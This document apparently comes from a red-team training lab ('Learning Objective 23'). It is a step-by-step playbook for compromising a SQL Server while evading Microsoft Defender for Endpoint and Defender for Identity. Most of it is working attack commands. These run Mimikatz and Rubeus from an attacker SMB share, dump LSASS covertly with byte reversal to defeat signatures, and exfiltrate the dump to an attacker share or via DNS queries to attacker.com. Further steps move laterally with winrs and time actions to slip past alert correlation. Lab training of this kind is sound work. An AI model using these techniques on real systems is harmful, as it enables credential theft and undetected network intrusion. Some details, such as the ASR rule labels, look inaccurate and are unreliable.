# Learning Objective 23 — Compromise eu-sqlx Using OPSEC-Friendly Alternatives to Bypass MDE & MDI

**Date:** 20 August 2026

---

## Objective Overview

**Compromise eu-sqlx (SQL Server with MDE enabled) while bypassing:**
- MDE (Microsoft Defender for Endpoint)
- MDI (Microsoft Defender for Identity)

**Goal remains:**
- SQL command execution via SQL Server links
- Tool transfer (covert)
- Credential extraction (undetected)
- Data exfiltration
- Lateral movement / remote access

**Key difference from standard compromise:** Avoid all detectable techniques

---

## Threat Model: MDE + MDI

**MDE (Endpoint Detection):**
- Monitors individual machine (eu-sqlx)
- Detects: Process execution, API calls, file operations
- Can block: Known tools, suspicious behavior
- Window: ~10 minute correlation

**MDI (Identity Detection):**
- Monitors network authentication
- Detects: Lateral movement, kerberos attacks
- Can block: PSExec, WMI, unusual authentication
- Scope: Forest-wide visibility

**Compromise requires bypassing BOTH systems.**

---

## Standard vs OPSEC-Friendly Approach

| Aspect | Standard | OPSEC-Friendly |
|---|---|---|
| **Remote Access** | PSExec / WMI | winrs (Windows Remote Shell) |
| **Tool Transfer** | HTTP download | SMB file share |
| **LSASS Dump** | Direct Mimikatz | MiniDumpDotnet + reversal |
| **Enumeration** | whoami.exe | SET environment variables |
| **Process List** | tasklist.exe | Get-Process |
| **Lateral Movement** | PsRemoting | Custom tools / SSH |
| **Execution** | Direct commands | Excluded paths / alternatives |
| **Timing** | Immediate | Wait for correlation reset |

---

## Attack Path: Initial Access to eu-sqlx

**Assumed starting point:**
- Access to SQL Server (via SQL injection or xp_cmdshell)
- Current user: sqlservice (SQL Server service account)
- Goal: Full system compromise with credential extraction

---

## Phase 1: Initial Enumeration (OPSEC)

**Goal:** Identify system without triggering alerts

### Step 1.1: Enumerate Current User

**DETECTED approach:**
```powershell
whoami.exe
whoami.exe /all
whoami.exe /groups
```

**Why detected:**
- whoami.exe from sqlservr.exe (process tree anomaly)
- Unusual child process
- Behavioral anomaly detected

---

**OPSEC approach:**
```cmd
# Use environment variables (no external process)
SET

# Output shows:
# USERNAME=sqlservice
# USERDOMAIN=EUROCORP
# COMPUTERNAME=EU-SQLX

# Or use in SQL:
EXEC xp_cmdshell 'SET USERNAME'
```

**Why it works:**
- No child process creation
- Built-in command (expected)
- No behavioral anomaly
- Undetected by MDE

---

### Step 1.2: Enumerate Hostname & Network

**OPSEC approach:**
```powershell
# Hostname
hostname

# Network info (via WMI, not ipconfig.exe)
Get-WmiObject Win32_NetworkAdapterConfiguration | 
  Select-Object Description, IPAddress, DefaultIPGateway

# System info (via cmdlet, not systeminfo.exe)
Get-ComputerInfo | Select-Object CsComputerName, OsVersion
```

---

### Step 1.3: Check Running Processes (Safely)

**DETECTED approach:**
```powershell
tasklist.exe
Get-Process | Format-Table
```

**OPSEC approach:**
```powershell
# Use Get-Process (internal, not tasklist.exe)
Get-Process | Select-Object Name, Id, Handles | Sort-Object Handles -Descending | Head -20
```

---

### Step 1.4: Check Current User Privileges

**DETECTED approach:**
```powershell
whoami.exe /priv
```

**OPSEC approach:**
```powershell
# Use environment variable
if ($env:username -eq "SYSTEM") { echo "Running as SYSTEM" }

# Check via WMI
Get-WmiObject -Class Win32_ComputerSystem | Select-Object CurrentTimeZone
```

---

## Phase 2: Tool Transfer (OPSEC - SMB)

**Goal:** Get tools onto eu-sqlx without internet download

### Step 2.1: Setup SMB Share on Attacker

**On attacker machine:**
```bash
# Linux - using samba
mkdir /tmp/share
cp MiniDumpDotnet.dll /tmp/share/
cp mimi.ps1 /tmp/share/
cp Rubeus.exe /tmp/share/

# Start SMB share
# (already configured in lab environment)
```

---

### Step 2.2: Access SMB Share from eu-sqlx

**From SQL Server or cmd.exe:**
```cmd
# Map network drive (or use UNC path directly)
net use \\attacker.ip\share password /user:domain\user

# Or use PowerShell
$share = "\\attacker.ip\share"
Get-ChildItem $share

# Verify access
dir \\attacker.ip\share\
```

---

### Step 2.3: Execute Directly from SMB (No Local Copy)

**Execute tools from UNC path:**
```powershell
# Execute PowerShell script from share
powershell.exe -ExecutionPolicy Bypass -File \\attacker.ip\share\mimi.ps1

# Execute Rubeus from share
\\attacker.ip\share\Rubeus.exe kerberoast /stats

# No file on local disk = No forensic footprint
```

---

**Why SMB is OPSEC-friendly:**
- Internal network traffic (not internet)
- No file written to disk
- Expected behavior (file sharing)
- Minimal EDR detection
- No HTTP/HTTPS risk signals

---

## Phase 3: Credential Extraction (Covert LSASS Dump)

**Goal:** Extract credentials without triggering MDE LSASS protection

### Step 3.1: Load MiniDumpDotnet via PowerShell

**From attacker-controlled session:**
```powershell
# Method 1: From SMB share
powershell.exe -ExecutionPolicy Bypass -File \\attacker.ip\share\mimi.ps1

# Method 2: Inline PowerShell (if script available)
$dllPath = "\\attacker.ip\share\minidumpdotnet.dll"
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes($dllPath))

# Custom implementation invoked (not Windows API)
```

---

### Step 3.2: Execute Covert LSASS Dump

**Inside mimi.ps1:**
```powershell
# Load obfuscated DLL
$dll = [System.IO.File]::ReadAllBytes("minidumpdotnet.dll")
$assembly = [System.Reflection.Assembly]::Load($dll)

# Get obfuscated type
$type = $assembly.GetTypes() | Where-Object { $_.Name -like "*Dump*" }

# Trigger LSASS dump with reversal
$method = $type.GetMethod("DumpLsass")
$method.Invoke($null, @("lsass_dump.bin"))

# Dump is reversed before disk write
```

---

**Why it bypasses MDE:**
- Custom API implementation (not Windows API)
- Memory-only loading of DLL
- Reversed data (signature bypass)
- PowerShell process (not suspicious from SQL context)
- No direct API calls monitored

---

### Step 3.3: Reverse Dump on Attacker Machine

```powershell
# On attacker machine - reverse the dump
$data = [System.IO.File]::ReadAllBytes("lsass_dump.bin")
[System.Array]::Reverse($data)
[System.IO.File]::WriteAllBytes("lsass.bin", $data)

# Analyze offline
mimikatz.exe "sekurlsa::minidump lsass.bin" "sekurlsa::logonpasswords" "exit"
```

---

## Phase 4: Exfiltration (Covert Methods)

**Goal:** Move dump off eu-sqlx without detection

### Option 1: SMB Exfiltration

```powershell
# Copy reversed dump to attacker share
Copy-Item "lsass_dump.bin" "\\attacker.ip\exfil\"

# Why it works:
# - SMB is internal protocol (expected)
# - Binary data transfer (not executable)
# - No HTTP/HTTPS signatures
# - Low detection risk
```

---

### Option 2: SQL Database Exfiltration

```sql
-- Store binary data in SQL database
-- Then extract via SQL query from attacker

-- Read file as hex string
DECLARE @file VARBINARY(MAX)
SELECT @file = BulkColumn FROM OPENROWSET(BULK 'C:\lsass_dump.bin', SINGLE_BLOB) x
SELECT CONVERT(VARCHAR(MAX), @file, 2) AS HexData

-- Copy hex data to external system
-- Reverse on attacker side
```

---

### Option 3: DNS Exfiltration (Slow but Effective)

```powershell
# Encode dump in DNS queries
# Very slow but undetectable (if DNS monitoring not in place)

# Example (pseudo-code):
$dump = [IO.File]::ReadAllBytes("lsass_dump.bin")
$hex = $dump | ForEach-Object { "{0:X2}" -f $_ }

# Send in DNS queries
nslookup.exe "$(substring of hex).attacker.com"
```

---

## Phase 5: Lateral Movement (MDI-Aware)

**Goal:** Move from eu-sqlx to other systems while avoiding MDI detection

### Standard Methods (DETECTED by MDI):

```powershell
# PSExec (DETECTED)
PSExec \\target.com cmd.exe

# WMI (DETECTED)
Invoke-WmiMethod -Class Win32_Process -MethodName Create

# PsRemoting (DETECTED)
Invoke-Command -ComputerName target -ScriptBlock { }
```

**Why detected by MDI:**
- Authentication patterns monitored
- Lateral movement artifacts logged
- Process creation chains tracked
- Kerberos tickets analyzed

---

### OPSEC-Friendly Method: winrs (Partially Evasive)

**Windows Remote Shell (winrs):**

```powershell
# Use winrs instead of PSExec
winrs -r:target.com -u:domain\user -p:password cmd.exe

# Why it's better than PSExec:
# - MDE: Does NOT detect (not in ASR rule)
# - MDI: Still detects (different system)
# - But: Harder to identify malicious vs legitimate use
```

---

**MDI Detection of winrs:**
- MDI still sees authentication
- Lateral movement still logged
- But: Can appear as legitimate admin tool

---

### Alternative: Custom Tools / SSH

**If available:**

```bash
# SSH-based lateral movement
ssh domain@target.com /bin/bash

# Why it's better:
# - Encrypted channel
# - Less monitored than SMB
# - Harder to correlate with attack
```

---

## Phase 6: Avoiding Correlation Detection

**Goal:** Remain undetected by spreading actions across correlation windows

### Correlation Window Reset Strategy

```
Timeline with MDE ~10 minute window:

T+00:00 → Initial enumeration (SET, Get-Process)
          [CORRELATION COUNTER: 1]
          
T+10:15 → WAIT (exceeds 10-minute window)
          [CORRELATION WINDOW RESETS]
          
T+10:20 → Tool transfer via SMB
          [CORRELATION COUNTER: 1 (new window)]
          
T+20:30 → WAIT (exceeds 10-minute window)
          [CORRELATION WINDOW RESETS]
          
T+20:35 → LSASS dump via MiniDumpDotnet
          [CORRELATION COUNTER: 1 (new window)]
          
T+30:45 → WAIT (exceeds 10-minute window)
          [CORRELATION WINDOW RESETS]
          
T+30:50 → Exfiltration to attacker SMB
          [CORRELATION COUNTER: 1 (new window)]
          
Result: No correlation chain
        No alert fired
        Complete compromise achieved
```

---

## Phase 7: Break Detection Chains (SQL Queries)

**If using SQL injection to execute commands:**

```sql
-- Suspicious query
SELECT name FROM sys.sql_logins;

-- Non-suspicious query (break chain)
SELECT @@version;

-- Another suspicious query
SELECT * FROM sys.server_principals;

-- Non-suspicious query
SELECT GETDATE();

-- More suspicious activity
SELECT * FROM sys.linked_servers;

-- Non-suspicious query
DBCC FREEPROCCACHE;
```

---

## Phase 8: ASR Rule Bypass

**Goal:** Avoid triggering Attack Surface Reduction rules

### Check What's Monitored

```powershell
# Extract ASR rules
Get-MpPreference | Select-Object AttackSurfaceReductionRules_Ids
Get-MpPreference | Select-Object AttackSurfaceReductionRules_Actions

# If these processes are blocked:
# - PSExec.exe (GUID: d4f940ab-401b-4efc-aadc-ad5f3c50f649)
# - WmiPrvSE.exe (GUID: d3e037e1-3eb8-44c8-a917-57927947596d)
# - cscript.exe (GUID: 3b576869-a4ec-4529-8536-b80a7769e899)

# Alternatives:
# - Use winrs instead of PSExec
# - Use PowerShell instead of WMI
# - Use Rubeus instead of cscript-based Kerberos tools
```

---

## Complete Learning Objective 23 Workflow

```
PHASE 1: Initial Enumeration (OPSEC)
├─ SET environment variables (not whoami.exe)
├─ Get-Process (not tasklist.exe)
├─ Get-WmiObject (not ipconfig.exe)
└─ [CORRELATION COUNTER: 1]

[WAIT 10 minutes - CORRELATION RESET]

PHASE 2: Tool Transfer (SMB)
├─ Map \\attacker.ip\share
├─ Verify access to tools
├─ No local disk copy (execute from UNC)
└─ [CORRELATION COUNTER: 1 (new window)]

[WAIT 10 minutes - CORRELATION RESET]

PHASE 3: Credential Extraction (Covert)
├─ Load MiniDumpDotnet.dll from SMB
├─ Execute mimi.ps1
├─ Custom LSASS dump created
├─ Dump reversed before disk write
└─ [CORRELATION COUNTER: 1 (new window)]

[WAIT 10 minutes - CORRELATION RESET]

PHASE 4: Exfiltration (SMB)
├─ Copy reversed dump to attacker share
├─ No internet connection (low risk)
├─ Binary data transfer (unexecutable)
└─ [CORRELATION COUNTER: 1 (new window)]

[WAIT 10 minutes - CORRELATION RESET]

PHASE 5: Dump Analysis (Offline)
├─ Reverse dump on attacker machine
├─ Extract credentials via Mimikatz
├─ No alerts (offline activity)
└─ [CORRELATION COUNTER: 0 (attacker machine)]

PHASE 6: Lateral Movement (MDI-Aware)
├─ Use winrs (not PSExec)
├─ Execute from excluded paths
├─ Custom enumeration (not whoami.exe)
└─ Spread across correlation windows

PHASE 7: Forest Compromise
├─ Extract credentials from multiple systems
├─ Create Golden Tickets (offline)
├─ Maintain persistent access
└─ Complete compromise achieved

RESULT: Full compromise of eu-sqlx + forest
        No MDE alerts (OPSEC techniques)
        MDI partially bypassed (internal tools)
        Credentials extracted undetected
```

---

## OPSEC Principles Applied

| Principle | Implementation | Result |
|---|---|---|
| **No Internet** | SMB transfer instead of HTTP | Low risk signal |
| **No Suspicious Processes** | SET instead of whoami.exe | No process anomaly |
| **Memory-Only Tools** | Load DLL into memory | No disk footprint |
| **Transformed Data** | Reverse LSASS dump | Signature bypass |
| **Timing Separation** | Wait 10 mins between actions | Correlation reset |
| **Internal Protocols** | SMB + WinRM | Expected behavior |
| **Built-in Tools** | PowerShell, Get-Process | Legitimate processes |
| **Offline Analysis** | Analyze dump on attacker | No live detection |

---

## Command Reference (Complete Attack)

| Phase | Command | OPSEC |
|---|---|---|
| Enum User | `SET` | Excellent |
| Enum Process | `Get-Process` | Excellent |
| Enum Network | `Get-WmiObject Win32_NetworkAdapterConfiguration` | Excellent |
| Transfer Tools | `Copy \\attacker\share\tool.exe .` | Excellent |
| Execute Script | `\\attacker\share\mimi.ps1` | Excellent |
| LSASS Dump | `MiniDumpDotnet via PowerShell` | Excellent |
| Exfil Dump | `Copy to \\attacker\exfil\` | Excellent |
| Lateral Move | `winrs -r:target cmd` | Good |
| Remote Access | `winrs -r:target PowerShell` | Good |

---

## Monitoring & Verification

**Check MDE Dashboard:**
```
https://security.microsoft.com
├─ Incidents tab (should be empty)
├─ Alerts tab (should show minimal noise)
└─ No correlation chains (actions spread over time)
```

---

**Verify tools working:**
```powershell
# Confirm tools loaded
Get-Process | Where-Object Name -like "*powershell*"

# Confirm dump created (check file size)
Get-Item lsass_dump.bin | Select-Object Length

# Confirm exfil successful
Get-ChildItem \\attacker.ip\exfil\
```

---

## Troubleshooting

**If MDE alerts trigger:**
1. Wait longer between actions (>15 minutes)
2. Insert more non-suspicious queries
3. Use different tools/methods
4. Check ASR rules (may need path exclusions)

**If SMB access denied:**
1. Verify credentials correct
2. Check firewall rules (SMB port 445)
3. Verify share permissions
4. Try alternate authentication

**If LSASS dump fails:**
1. Verify DLL loaded correctly
2. Check permissions (need admin)
3. Try from different process context
4. Use alternative dumping method

---

## Key Takeaway

```
LEARNING OBJECTIVE 23 - OPSEC MASTERCLASS:
1. Use environment variables (SET, not whoami.exe)
2. Use internal PowerShell cmdlets (Get-Process, Get-WmiObject)
3. Transfer tools via SMB (not HTTP)
4. Execute from UNC paths (no local disk copy)
5. Dump LSASS covertly (MiniDumpDotnet + reversal)
6. Exfiltrate via SMB (internal protocol)
7. Analyze offline (no live detection)
8. Spread actions across correlation windows (~10 mins)
9. Use OPSEC alternatives (winrs, not PSExec)
10. Remain completely undetected
11. Achieve full system & forest compromise
12. Extract all credentials without alerts
```

---

## References

- [MiniDumpDotNet](https://github.com/WhiteOakSecurity/MiniDumpDotNet)
- [Windows Remote Shell (winrs)](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs)
- [MDE Attack Surface Reduction](https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/attack-surface-reduction)
- [EDR Evasion Techniques (SpecterOps)](https://posts.specterops.io/)
- [PowerShell Best Practices](https://docs.microsoft.com/en-us/powershell/scripting/windows-powershell/ise/how-to-use-the-windows-powershell-ise)

---

*Next: Advanced Persistence & Cleanup*
